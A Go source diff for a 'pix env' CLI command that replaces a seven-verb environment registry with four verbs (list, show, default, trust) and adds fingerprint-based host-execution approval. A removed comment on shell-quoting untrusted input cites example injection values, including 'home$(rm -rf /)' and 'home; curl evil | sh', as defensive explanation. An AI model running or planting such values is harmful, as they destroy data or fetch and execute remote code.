@@ -1,51 +1,51 @@
-// env_cmd.go — `pix env`: the dispatch skeleton (E1.9) for the seven-verb
-// native-environment surface docs/design/environments.md §8 and PRD §5.10
-// define (`ls add use show edit review forget`; `pix env rm` is never one
-// of them). E1.9 wired the first three verbs workflow/env already had
-// behind it — `ls` (workflow/env/ls.go), `show` (workflow/env/show.go),
-// `review` (E1.8's workflow/env/review.go). E1.10 added `add`
-// (workflow/env/add.go): register a caller-authored directory, or
-// scaffold a fresh one, then ALWAYS run the same E1.8 review before
-// anything commits. E1.11 added `use`, `forget`, and the `rm` pointer
-// error below. E1.12 (this unit) added `edit` (workflow/env/edit.go):
-// open pix.toml or .sbxenv.yaml in $VISUAL/$EDITOR, then reload and
-// validate. All seven verbs (units.json's file-conflict table: "E1.9 owns
-// the struct; each verb unit adds one field line + its own file. Land in
-// ID order, rebase.") are now wired, in PRD §5.10 order: ls, add, use,
-// show, edit, review, forget, plus the hidden `rm` pointer.
-//
-// There is deliberately NO placeholder field for a verb that does not
-// exist yet: an unregistered subcommand answers with kong's own generic
-// "unexpected argument" rather than a hand-authored stub that could be
-// mistaken for a real, if incomplete, verb — nothing here advertises a
-// success path a later unit has not built.
-//
-// Bare `pix env` is `env ls` (Ls's kong `default` tag — the same idiom
-// pack_cmd.go's packCmd already uses for `pix pack` -> `pack ls`).
+// env_cmd.go — `pix env`: list | show | default | trust (docs/design/
+// pix-v2-surface.md §3.4). An environment IS a directory under
+// ~/.pix/envs/<name>/; there is no registration database and no
+// add/edit/use/forget mutation path — those verbs are gone in v2. Selection
+// and listing come from workflow/env's pixhome-based ResolveIn/List
+// (home.go). `default` reads/writes the one config.toml field pixhome.Machine
+// owns. `trust` is the explicit host-execution approval command: it
+// fingerprints the environment's two authored files and records acceptance
+// under ~/.pix/state/trust, outside the environment directory itself.
 package main
 
 import (
+	"bufio"
+	"crypto/sha256"
+	"encoding/hex"
+	"encoding/json"
 	"fmt"
+	"os"
+	"path/filepath"
 	"strings"
-	"unicode"
+	"time"
 
 	"pix/host/cli"
-	"pix/host/sys"
-	"pix/host/workflow/env"
+	"pix/host/pixhome"
+	nativeenv "pix/host/workflow/env"
 )
 
-// envRun is env's analog of pack_cmd.go's packRun: the ONE place a
-// workflow/env error becomes a printed line and an exit code. It exists
-// because workflow/env's own error types (resolve.go/load.go's
-// UnknownEnvironmentError, ContainmentError, SymlinkError,
-// MissingRequiredFileError, NoncanonicalRootError; show.go's
-// NoSelectionForPathError) already self-prefix "pix: " — the root's own generic
-// `fmt.Fprintf(d.Err, "pix: %v\n", err)` would otherwise print
-// "pix: pix: ...". Printing here and returning the error SILENT (so the
-// root never touches it again) is correct either way: an
-// already-prefixed message prints verbatim, and an unprefixed one (a
-// plain operational error surfacing from, say, a corrupt trust store)
-// gets exactly one prefix added rather than zero.
+func (c *envCmd) Help() string {
+	return `A named environment: a directory under ~/.pix/envs/<name>/ declaring
+.sbxenv.yaml (native sbx grammar) and an optional pix.toml sidecar.
+
+Four verbs: list, show, default, trust. There is no add/edit/use/forget:
+create, edit, move, and remove an environment with ordinary filesystem and
+Git tools under ~/.pix/envs. 'pix setup' may scaffold a default one.
+
+An environment that runs host code or handles a credential must be
+approved with 'pix env trust NAME' before a launch will use it.`
+}
+
+// envCmd's field ORDER is the v2 four-verb surface; bare 'pix env' is
+// 'env list'.
+type envCmd struct {
+	List    envListCmd    `cmd:"" default:"1" help:"List environments under ~/.pix/envs, the default, and trust state."`
+	Show    envShowCmd    `cmd:"" help:"What NAME is: files, resolved root, trust state."`
+	Default envDefaultCmd `cmd:"" help:"Print, or set, the machine default environment."`
+	Trust   envTrustCmd   `cmd:"" help:"Read and accept what NAME runs on your host."`
+}
+
 func envRun(d *cli.Deps, err error) error {
 	if err == nil {
 		return nil
@@ -58,441 +58,239 @@ func envRun(d *cli.Deps, err error) error {
 	return cli.SilentError{Code: cli.ExitCode(err)}
 }
 
-// envCmd is a child of the kong root; bare `pix env` is `env ls`.
-func (c *envCmd) Help() string {
-	return `A named launch context: what runs, what mounts, which models, which MCP
-servers. See docs/design/environments.md.
+func envHome() (pixhome.Paths, error) { return pixhome.Resolve() }
 
-Seven verbs: ls, add, use, show, edit, review, forget. There is no
-'pix env rm': registering a name is not owning its files; forget only
-unregisters, and it deletes nothing. All seven work now.
+// ── list ─────────────────────────────────────────────────────────────────
 
-'edit NAME pix|sbxenv' opens pix.toml or .sbxenv.yaml in $VISUAL/$EDITOR
-(exact positional enum, no flag), then reloads and validates: it never
-prompts to accept a host-execution change inline: a changed footprint
-prints 'pix env review NAME' as the next step instead.
-
-An environment that runs code on your host or hands it a credential halts
-at 'pix env review NAME': [y/N], default No. A non-TTY review fails closed
-unless --yes.`
+type envListCmd struct {
+	JSON bool `help:"Emit machine-readable JSON."`
 }
 
-// envCmd's field ORDER is significant only in that Ls is `default:"1"`
-// (bare `pix env` -> ls); it is not yet the full seven-verb table — see
-// this file's package doc comment.
-type envCmd struct {
-	Ls     envLsCmd     `cmd:"" default:"1" help:"List registered environments. Marks the default."`
-	Add    envAddCmd    `cmd:"" help:"Register a directory, or scaffold a new one, then review it."`
-	Use    envUseCmd    `cmd:"" help:"Set the machine default. Refuses an environment that runs code on your host until it has been reviewed, or one whose footprint changed since review."`
-	Show   envShowCmd   `cmd:"" help:"What NAME is: files, models, mounts, MCP, review state, drift."`
-	Edit   envEditCmd   `cmd:"" help:"Open pix.toml or .sbxenv.yaml in $VISUAL/$EDITOR, then validate."`
-	Review envReviewCmd `cmd:"" help:"Read and accept what NAME runs on your host."`
-	Forget envForgetCmd `cmd:"" help:"Unregister NAME. Never deletes the environment directory."`
-	// Rm is not a verb (Seven verbs, no more — this file's own package doc
-	// comment, docs/design/environments.md §8): it exists ONLY so kong's own
-	// dispatch resolves `pix env rm ...` to THIS deterministic pointer error
-	// rather than kong's generic "unexpected argument" — see envRmCmd's own
-	// doc comment. `hidden:""` is what keeps it off every help listing
-	// (models_cmd.go's Status field is the same idiom) while leaving it
-	// fully dispatchable; help_test.go's exact-seven-verb assertions are what
-	// prove `hidden` actually holds that line.
-	Rm envRmCmd `cmd:"" hidden:""`
+type envListRow struct {
+	Name      string `json:"name"`
+	Root      string `json:"root"`
+	Symlinked bool   `json:"symlinked"`
+	Default   bool   `json:"default"`
+	Trusted   bool   `json:"trusted"`
 }
 
-// ── ls ───────────────────────────────────────────────────────────────────
-
-type envLsCmd struct {
-	JSON bool `help:"Emit machine-readable JSON (schema_version)."`
-}
-
-func (c *envLsCmd) Run(d *cli.Deps) error {
-	cfg, err := d.Config()
+func (c *envListCmd) Run(d *cli.Deps) error {
+	home, err := envHome()
 	if err != nil {
 		return err
 	}
-	r, err := env.ComputeLs(cfg)
+	sels, err := nativeenv.List(home)
 	if err != nil {
 		return envRun(d, err)
 	}
+	m, _ := pixhome.LoadMachine(home)
+	rows := make([]envListRow, 0, len(sels))
+	for _, s := range sels {
+		trusted, _ := trustAccepted(home, s)
+		rows = append(rows, envListRow{
+			Name: s.Name, Root: s.Root, Symlinked: s.Symlinked,
+			Default: s.Name == m.DefaultEnvironment, Trusted: trusted,
+		})
+	}
 	if c.JSON {
-		return env.RenderLsJSON(d.Out, r)
+		b, _ := json.MarshalIndent(rows, "", "  ")
+		fmt.Fprintln(d.Out, string(b))
+		return nil
 	}
-	env.RenderLs(d.Out, r)
+	if len(rows) == 0 {
+		fmt.Fprintln(d.Out, "No environments yet. Create one: mkdir -p ~/.pix/envs/<name> && author .sbxenv.yaml there.")
+		return nil
+	}
+	for _, r := range rows {
+		mark := ""
+		if r.Default {
+			mark = " (default)"
+		}
+		trust := "untrusted"
+		if r.Trusted {
+			trust = "trusted"
+		}
+		fmt.Fprintf(d.Out, "%s\t%s\t%s%s\n", r.Name, r.Root, trust, mark)
+	}
 	return nil
-}
-
-// ── add ──────────────────────────────────────────────────────────────────
-
-// envAddCmd is `pix env add NAME [PATH]` (E1.10, docs/design/
-// environments.md §8.1, D10). Path optional (empty) means scaffold; any
-// other value means register that exact directory. Verbose/Yes are
-// forwarded to the SAME E1.8 review Add always ends with — review's own
-// `--verbose`/`--yes` (envReviewCmd, above), not a second, independent
-// trust gate `add` invents for itself.
-type envAddCmd struct {
-	Name    string `arg:"" help:"Exact environment name."`
-	Path    string `arg:"" optional:"" help:"Canonical local directory (omit to scaffold a new one)."`
-	Verbose bool   `help:"Full argv and content digests for every host command/service (forwarded to review)."`
-	Yes     bool   `help:"Accept the host-execution bill without an interactive prompt (forwarded to review)."`
-}
-
-func (c *envAddCmd) Run(d *cli.Deps) error {
-	cfg, err := d.Config()
-	if err != nil {
-		return err
-	}
-	// nil LookPath below defaults (inside Load) to the real exec.LookPath —
-	// see envReviewCmd.Run's identical nil-effective-mounts note for why
-	// there is no separate, independently-suppliable workspace list here
-	// either.
-	_, err = env.Add(cfg, c.Name, c.Path, env.AddOptions{
-		Verbose: c.Verbose, Yes: c.Yes, TTY: d.Interactive, In: d.In, Out: d.Out,
-	})
-	return envRun(d, err)
 }
 
 // ── show ─────────────────────────────────────────────────────────────────
 
-// envShowCmd's three flags are mutually exclusive (enforced in Run, before
-// any config load): each is a COMPLETE, distinct answer to "what is NAME"
-// (a lossy summary, a bare path, the byte-identical effective document),
-// never a modifier on one another.
 type envShowCmd struct {
-	Name      string `arg:"" optional:"" help:"Exact environment name (default: the selected environment)."`
-	Path      bool   `help:"Print only the canonical root, plus a trailing newline."`
-	JSON      bool   `help:"Emit machine-readable JSON (schema_version)."`
-	Effective bool   `help:"Render the byte-identical document sbx would receive (not yet available)."`
+	Name string `arg:"" help:"Exact environment name."`
+	JSON bool   `help:"Emit machine-readable JSON."`
+	Path bool   `help:"Print only the resolved root."`
 }
 
 func (c *envShowCmd) Run(d *cli.Deps) error {
-	if countTrue(c.Path, c.JSON, c.Effective) > 1 {
-		// Three-part (C6): the failure statement, the valid modes as DATA
-		// (never three separate command lines a reader could mistake for
-		// three independent fixes), and exactly ONE runnable retry — the
-		// plain `env show NAME` form, since it is the one invocation that is
-		// always valid regardless of which conflicting combination was
-		// given. Routed through envRun (rather than returned directly, as
-		// this used to) so its self-prefixed "pix: " is never doubled by
-		// dispatch's own generic `"pix: %v"` printer — the same reason every
-		// other typed refusal in this package goes through envRun.
-		// An empty NAME is a genuinely omitted positional, never a typed
-		// value to echo back — `<name>` is the placeholder the caller fills
-		// in, the same convention config's UnknownEnvironmentError already
-		// establishes for a rejected name (never echo a typo back as the
-		// "fix"). A NON-empty NAME is exactly what the caller typed and IS
-		// the correct retry argument, so it is shell-quoted (sys.ShellQuote)
-		// rather than replaced — this refusal is about the conflicting
-		// FLAGS, never about NAME's own validity.
-		name := "<name>"
-		if c.Name != "" {
-			name = sys.ShellQuote(c.Name)
-		}
-		return envRun(d, cli.Usagef(
-			"pix: env show: --path, --json and --effective are mutually exclusive; pick exactly one.\n"+
-				"     valid: --path, --json, --effective\n"+
-				"     retry: pix env show %s",
-			name))
-	}
-	cfg, err := d.Config()
+	home, err := envHome()
 	if err != nil {
 		return err
 	}
-	if c.Effective {
-		// E2.1 wires this to workflow/env's ONE call site into envinfo's ONE
-		// effective-document producer (F17) — never a second, independently
-		// shaped rendering in its place. The bytes this prints are, byte for
-		// byte, whatever env.RenderEffectiveDocument returns: no reformatting,
-		// no trailing-newline massage, nothing added or removed here.
-		out, err := env.RenderEffectiveDocument(cfg, c.Name)
-		if err != nil {
-			return envRun(d, err)
-		}
-		d.Out.Write(out)
-		return nil
-	}
-	r, err := env.ComputeShow(cfg, c.Name)
+	sel, err := nativeenv.ResolveIn(home, c.Name)
 	if err != nil {
 		return envRun(d, err)
 	}
 	if c.Path {
-		if !r.Selected {
-			return envRun(d, env.NoSelectionForPathError(cfg))
-		}
-		env.RenderShowPath(d.Out, r)
+		fmt.Fprintln(d.Out, sel.Root)
 		return nil
 	}
+	trusted, fp := trustAccepted(home, sel)
 	if c.JSON {
-		return env.RenderShowJSON(d.Out, r)
+		b, _ := json.MarshalIndent(map[string]any{
+			"name": sel.Name, "root": sel.Root, "symlinked": sel.Symlinked,
+			"trusted": trusted, "fingerprint": fp,
+		}, "", "  ")
+		fmt.Fprintln(d.Out, string(b))
+		return nil
 	}
-	r.SandboxState = envSandboxState(cfg, r.Root)
-	env.RenderShowDefault(d.Out, r)
+	fmt.Fprintf(d.Out, "name:        %s\n", sel.Name)
+	fmt.Fprintf(d.Out, "root:        %s\n", sel.Root)
+	fmt.Fprintf(d.Out, "symlinked:   %v\n", sel.Symlinked)
+	fmt.Fprintf(d.Out, "sbxenv:      %s\n", presentIfExists(sel.SbxEnvPath()))
+	fmt.Fprintf(d.Out, "sidecar:     %s\n", presentIfExists(sel.SidecarPath()))
+	fmt.Fprintf(d.Out, "trusted:     %v\n", trusted)
 	return nil
 }
 
-// countTrue is the shared arity check behind envShowCmd's mutual-exclusion
-// gate — a tiny local helper rather than a cli package export, since no
-// other verb needs it yet.
-func countTrue(bs ...bool) int {
-	n := 0
-	for _, b := range bs {
-		if b {
-			n++
+func presentIfExists(path string) string {
+	if _, err := os.Stat(path); err == nil {
+		return path
+	}
+	return "(absent)"
+}
+
+// ── default ──────────────────────────────────────────────────────────────
+
+type envDefaultCmd struct {
+	Name string `arg:"" optional:"" help:"Set the machine default to this exact environment name (omit to print it)."`
+}
+
+func (c *envDefaultCmd) Run(d *cli.Deps) error {
+	home, err := envHome()
+	if err != nil {
+		return err
+	}
+	if c.Name == "" {
+		m, err := pixhome.LoadMachine(home)
+		if err != nil {
+			return err
 		}
+		if m.DefaultEnvironment == "" {
+			fmt.Fprintln(d.Out, "no default environment set")
+			return nil
+		}
+		fmt.Fprintln(d.Out, m.DefaultEnvironment)
+		return nil
 	}
-	return n
-}
-
-// ── edit ─────────────────────────────────────────────────────────────────
-
-// envEditCmd's Target is an exact positional enum ("pix" or "sbxenv"),
-// never a flag — there is deliberately no `--sbxenv` flag anywhere in this
-// dispatch. It is validated by hand in workflow/env.Edit, the same
-// `optional:""` + hand-checked-switch idiom configPathCmd's Kind already
-// uses, rather than kong's own `enum` tag: an unrecognized or omitted
-// token needs THIS package's own two-explicit-forms message (env.Edit's
-// editTargetUsageError), not kong's generic "expected one of" text.
-type envEditCmd struct {
-	Name   string `arg:"" help:"Exact environment name."`
-	Target string `arg:"" optional:"" help:"'pix' for pix.toml, 'sbxenv' for .sbxenv.yaml. Omit on a TTY to be asked."`
-}
-
-func (c *envEditCmd) Run(d *cli.Deps) error {
-	cfg, err := d.Config()
-	if err != nil {
-		return err
-	}
-	_, err = env.Edit(cfg, d.Sys, c.Name, c.Target, env.EditOptions{
-		TTY: d.Interactive, In: d.In, Out: d.Out,
-	})
-	return envRun(d, err)
-}
-
-// ── review ───────────────────────────────────────────────────────────────
-
-type envReviewCmd struct {
-	Name    string `arg:"" help:"Exact environment name."`
-	Verbose bool   `help:"Full argv and content digests for every host command/service."`
-	Yes     bool   `help:"Accept the host-execution bill without an interactive prompt."`
-}
-
-func (c *envReviewCmd) Run(d *cli.Deps) error {
-	cfg, err := d.Config()
-	if err != nil {
-		return err
-	}
-	// No composition-owned EffectiveMounts yet: nil is the intrinsic
-	// pre-E2 set, derived deterministically and CWD-independently —
-	// Load itself adds the environment's own root, read-only, for skill
-	// validation (load.go's own doc comment), and NEVER a project/current-
-	// cwd mount, since neither this dispatcher nor Load ever consults
-	// os.Getwd. There is no separate `workspaces` argument here to diverge
-	// from this value — env.Review takes exactly one typed effective
-	// workspace set and feeds it identically to Load and ComputeBoM (see
-	// env.Review's own doc comment). A nil lookPath defaults to the real
-	// exec.LookPath.
-	//
-	// Future E2's launch composition is FORCED, by this same signature, to
-	// supply a real EffectiveMounts value here instead of nil — the
-	// compile-time seam is env.Review's parameter type itself
-	// (EffectiveMounts, not a bare []string a caller could satisfy with an
-	// unrelated slice): E2 cannot add a writable project mount without
-	// constructing one.
-	_, err = env.Review(cfg, c.Name, nil, nil, env.ReviewOptions{
-		Verbose: c.Verbose, Yes: c.Yes, TTY: d.Interactive, In: d.In, Out: d.Out,
-	})
-	return envRun(d, err)
-}
-
-// ── use ──────────────────────────────────────────────────────────────────
-
-type envUseCmd struct {
-	Name string `arg:"" help:"Exact environment name."`
-}
-
-// Run delegates env.Use's ONE gated mutation (cfg.Environment) whole:
-// validation, the mutation, AND the save all happen inside env.Use, under
-// the env-registry lock against a fresh under-lock config reload
-// (workflow/env/commit.go) — never a cfg.Save() here on the Deps-cached
-// copy, which may be stale against a concurrent pix process's commit.
-// There is no lookPath override here for the same reason `env review`/
-// `env show` pass nil: a real symlink/PATH check runs against the actual
-// filesystem in production, and a test reaches env.Use directly to inject
-// one. Use never launches anything — its whole effect ends at that one
-// locked commit.
-func (c *envUseCmd) Run(d *cli.Deps) error {
-	cfg, err := d.Config()
-	if err != nil {
-		return err
-	}
-	if err := env.Use(cfg, c.Name, nil); err != nil {
+	// Validate it resolves before recording it as the default: a typo must
+	// not become every future launch's silent failure.
+	if _, err := nativeenv.ResolveIn(home, c.Name); err != nil {
 		return envRun(d, err)
+	}
+	if err := pixhome.SetDefaultEnvironment(home, c.Name); err != nil {
+		return err
 	}
 	fmt.Fprintf(d.Out, "pix: environment %q is now the default.\n", c.Name)
 	return nil
 }
 
-// ── forget ───────────────────────────────────────────────────────────────
+// ── trust ────────────────────────────────────────────────────────────────
 
-type envForgetCmd struct {
-	Name string `arg:"" help:"Exact environment name."`
+// envTrustRecord is the acceptance record persisted at
+// <PIX_HOME>/state/trust/environments/<name>.json — outside the environment
+// root itself, per docs/design/pix-v2-surface.md §9 ("Approval is stored
+// under ~/.pix/state, never inside the environment being approved").
+type envTrustRecord struct {
+	Root        string `json:"root"`
+	Fingerprint string `json:"fingerprint"`
+	AcceptedAt  string `json:"accepted_at"`
 }
 
-// Run delegates env.Forget's ONE gated mutation (unregistering c.Name)
-// whole: refusals, the mutation, AND the save all happen inside env.Forget,
-// under the env-registry lock against a fresh under-lock config reload
-// (workflow/env/commit.go) — never a cfg.Save() here on the Deps-cached
-// copy, which may be stale against a concurrent pix process's commit. No
-// holder probe is wired here yet: no launch cutover exists that could make
-// one true (env.NoLiveHolders' own doc comment), so nil defaults to it —
-// the seam is real even though nothing populates it today.
-func (c *envForgetCmd) Run(d *cli.Deps) error {
-	cfg, err := d.Config()
+func trustRecordPath(home pixhome.Paths, name string) string {
+	return filepath.Join(home.StateTrustEnvironments, name+".json")
+}
+
+// environmentFingerprint hashes the byte content of both files this package
+// interprets (.sbxenv.yaml, pix.toml). A file that does not exist
+// contributes its path only, so adding/removing either file changes the
+// fingerprint too.
+func environmentFingerprint(sel nativeenv.Selected) (string, error) {
+	h := sha256.New()
+	for _, p := range []string{sel.SbxEnvPath(), sel.SidecarPath()} {
+		fmt.Fprintf(h, "path=%s\n", p)
+		if data, err := os.ReadFile(p); err == nil {
+			h.Write(data)
+		}
+	}
+	return "sha256:" + hex.EncodeToString(h.Sum(nil)), nil
+}
+
+// trustAccepted reports whether sel's CURRENT fingerprint matches a
+// recorded acceptance. A changed fingerprint (file edited since trust) or no
+// record at all both report false: a stale approval never counts as trust.
+func trustAccepted(home pixhome.Paths, sel nativeenv.Selected) (bool, string) {
+	fp, err := environmentFingerprint(sel)
+	if err != nil {
+		return false, ""
+	}
+	data, err := os.ReadFile(trustRecordPath(home, sel.Name))
+	if err != nil {
+		return false, fp
+	}
+	var rec envTrustRecord
+	if json.Unmarshal(data, &rec) != nil {
+		return false, fp
+	}
+	return rec.Fingerprint == fp && rec.Root == sel.Root, fp
+}
+
+type envTrustCmd struct {
+	Name string `arg:"" help:"Exact environment name."`
+	Yes  bool   `help:"Accept without an interactive prompt (still prints what is being approved)."`
+}
+
+func (c *envTrustCmd) Run(d *cli.Deps) error {
+	home, err := envHome()
 	if err != nil {
 		return err
 	}
-	root, err := env.Forget(cfg, c.Name, envHolderProbe(cfg))
+	sel, err := nativeenv.ResolveIn(home, c.Name)
 	if err != nil {
 		return envRun(d, err)
 	}
-	fmt.Fprintf(d.Out, "pix: environment %q unregistered. Source untouched: %s\n", c.Name, root)
+	fp, err := environmentFingerprint(sel)
+	if err != nil {
+		return err
+	}
+	fmt.Fprintf(d.Out, "pix env trust %s\n", sel.Name)
+	fmt.Fprintf(d.Out, "  root:        %s\n", sel.Root)
+	fmt.Fprintf(d.Out, "  sbxenv:      %s\n", presentIfExists(sel.SbxEnvPath()))
+	fmt.Fprintf(d.Out, "  sidecar:     %s\n", presentIfExists(sel.SidecarPath()))
+	fmt.Fprintf(d.Out, "  fingerprint: %s\n", fp)
+	accept := c.Yes
+	if !c.Yes {
+		if !d.Interactive {
+			return envRun(d, fmt.Errorf("env trust: refusing to accept on a non-interactive terminal without --yes"))
+		}
+		fmt.Fprint(d.Out, "Accept and record this exact fingerprint? [y/N] ")
+		reader := bufio.NewReader(d.In)
+		line, _ := reader.ReadString('\n')
+		accept = strings.EqualFold(strings.TrimSpace(line), "y")
+	}
+	if !accept {
+		fmt.Fprintln(d.Out, "pix: not accepted.")
+		return cli.SilentError{Code: 1}
+	}
+	if err := os.MkdirAll(home.StateTrustEnvironments, 0o700); err != nil {
+		return err
+	}
+	rec := envTrustRecord{Root: sel.Root, Fingerprint: fp, AcceptedAt: time.Now().UTC().Format(time.RFC3339)}
+	b, _ := json.MarshalIndent(rec, "", "  ")
+	if err := os.WriteFile(trustRecordPath(home, sel.Name), b, 0o600); err != nil {
+		return err
+	}
+	fmt.Fprintf(d.Out, "pix: environment %q trusted.\n", sel.Name)
 	return nil
-}
-
-// ── rm: the pointer error, not a working alias ──────────────────────────
-
-// rmPointerMaxNameLen caps how many runes of the typed NAME
-// envRmPointerError will ever echo back. config.environmentNameRE already
-// caps a REAL registered name at 128 runes; this pointer never reads the
-// registry at all (see envRmCmd's own doc comment), so it has no such gate
-// of its own — this constant is that same bound, applied to untrusted argv
-// instead, so a pathological invocation cannot blow up a two-line
-// diagnostic.
-const rmPointerMaxNameLen = 128
-
-// rmPointerFallbackName is what envRmPointerError names when `pix env rm`
-// carried no usable NAME at all (bare `pix env rm`, or only flag-shaped
-// tokens after it) — the bare word this file's OWN help text already uses
-// for the identical role everywhere else a verb takes a name (Forget's
-// `help:"Unregister NAME. ..."`, Edit's `'edit NAME pix|sbxenv'`), never
-// the `<name>` bracket form docs/design/environments.md §8.1's OTHER
-// generic fix lines use for a name the user has not chosen yet — there is
-// no fabricated example (never hardcoded "home") standing in for a real
-// answer either way.
-const rmPointerFallbackName = "NAME"
-
-// rmPointerName picks the value envRmPointerError echoes as NAME: the
-// first token in args that does not look like a flag (a leading "-") —
-// envRmCmd.Args swallows flags and positional garbage alike, so `pix env
-// rm --force home` must still point at "home", not "--force". No candidate
-// at all (args empty, or entirely flag-shaped) answers rmPointerFallbackName
-// rather than fabricating one.
-func rmPointerName(args []string) string {
-	for _, a := range args {
-		if a == "" || strings.HasPrefix(a, "-") {
-			continue
-		}
-		return sanitizeRmPointerName(a)
-	}
-	return rmPointerFallbackName
-}
-
-// sanitizeRmPointerName turns raw argv text into safe display copy for the
-// rm pointer error. envRmCmd.Run reads nothing and validates nothing (its
-// own doc comment: zero config reads, zero mutation) — unlike every other
-// `pix env` verb's Name, which config.validEnvironmentName gates before it
-// ever reaches a printed line, this NAME is untrusted input echoed straight
-// from the command line. Any Unicode control character (a bare newline or
-// carriage return that would forge an extra line of terminal output, an
-// ESC that could start a terminal escape sequence, a tab that could fake
-// column alignment, ...) is DROPPED outright rather than replaced, and the
-// result is capped to rmPointerMaxNameLen runes. This only keeps the
-// OUTPUT ITSELF from being control-character- or fake-extra-line-shaped;
-// it says nothing about shell metacharacters ($(...), ;, `, |, ...) that
-// pass through unremoved — that is envRmPointerError's job (sys.ShellQuote
-// on this function's already-sanitized result), not this one's: control
-// stripping and shell quoting are two different threats (forged terminal
-// output vs. forged shell command) and stay two different, independently
-// testable steps.
-func sanitizeRmPointerName(raw string) string {
-	var b strings.Builder
-	n := 0
-	for _, r := range raw {
-		if unicode.IsControl(r) {
-			continue
-		}
-		if n >= rmPointerMaxNameLen {
-			break
-		}
-		b.WriteRune(r)
-		n++
-	}
-	return b.String()
-}
-
-// envRmPointerError is docs/design/environments.md §8.1's exact rm refusal
-// (PRD §5.5): it names the three distinct things a user might actually
-// want removed, so the wrong one is never removed by accident. name is
-// rmPointerName's already-sanitized pick (control characters already
-// dropped, length already capped) — sys.ShellQuote runs over it HERE,
-// after that sanitization, before either interpolation below: a fix line
-// is meant to be copy-pasted straight into a real shell, so untrusted argv
-// text embedded in it (a `home$(rm -rf /)` or `home; curl evil | sh`
-// typo-turned-argument) MUST tokenize as one inert literal word there, not
-// as a command substitution or a second command. sys.ShellQuote leaves an
-// already-safe token (letters, digits, and the usual name punctuation)
-// untouched, so every existing plain-name fix line prints identically to
-// before; it single-quotes anything else. Both the forget line's name and
-// the rm line's sandbox token get the SAME quoted value — quoting only the
-// interpolated tail of `pix-repo-%s` is syntactically fine (an unquoted
-// literal prefix directly abutting a quoted tail is one shell word, exactly
-// as sys.ShellSplit's own doc comment describes), and it is this pointer's
-// only structural link to `pix-repo-<name>`; see that literal's own comment
-// below for why it stays `pix-repo-`, not today's actual sandbox-naming
-// scheme. The delete-source line stays the fixed `<path>` placeholder,
-// since there is no environment root to name at all here (this command
-// never resolves one).
-func envRmPointerError(name string) string {
-	q := sys.ShellQuote(name)
-	return fmt.Sprintf("pix: `pix env rm` does not exist. Registering a name is not owning the files.\n"+
-		"     pix env forget %s   unregister the name (deletes no files)\n"+
-		"     pix rm pix-repo-%s   remove the sandbox\n"+
-		"     rm -rf <path>   delete the source yourself; pix will not\n", q, q)
-}
-
-// The `pix-repo-` prefix above is PRD §5.5's frozen sandbox-naming
-// contract for an environment-launched sandbox, not a description of any
-// sandbox that exists today: NO env-driven launch cutover exists yet (Wave
-// D — see workflow/env/forget.go's identical "no live sandbox anywhere
-// associates itself with an environment NAME yet" note on HolderProbe),
-// so `pix rm pix-repo-work` currently names a sandbox that never gets
-// created by anything in this tree. It is NOT the same string
-// resolveSandboxName/sandbox.Name produces today for an ordinary `pix run`
-// (the generic, digest-suffixed `pix-<basename>-<8-hex digest>`, e.g.
-// `pix-work-a1b2c3d4`) — that is a DIFFERENT, pre-Wave-D naming scheme for
-// a workspace directory, answering a different question ("which directory
-// did you launch from") than this one ("which environment is this
-// sandbox's identity"). Do not "fix" pix-repo-%s here to match
-// sandbox.Name's current output: the two are deliberately decoupled until
-// Wave D wires an environment-identified sandbox naming path, and until
-// then this line is aspirational spec text, not a bug.
-
-// envRmCmd exists only to give kong a deterministic node to dispatch `pix
-// env rm ...` TO — see this struct field's own comment on envCmd. Args
-// swallows anything after `rm` (a name, flags, garbage) so no shape of
-// invocation ever falls through to kong's own "unexpected argument";
-// every one of them lands here and gets the SAME pointer error, naming
-// whatever NAME rmPointerName picks out of it. Run reads no config,
-// resolves no name against the real registry, and touches no file: this
-// command performs ZERO mutation of any kind before returning its fixed
-// exit 2, exactly because it never earns the chance to — there is nothing
-// here it could even ask permission for. That holds regardless of what
-// argv it was handed: rmPointerName/sanitizeRmPointerName above only shape
-// what gets PRINTED, never anything this Run reads back or acts on.
-type envRmCmd struct {
-	Args []string `arg:"" optional:"" passthrough:"" hidden:""`
-}
-
-func (c *envRmCmd) Run(d *cli.Deps) error {
-	fmt.Fprint(d.Err, envRmPointerError(rmPointerName(c.Args)))
-	return cli.SilentError{Code: 2}
 }
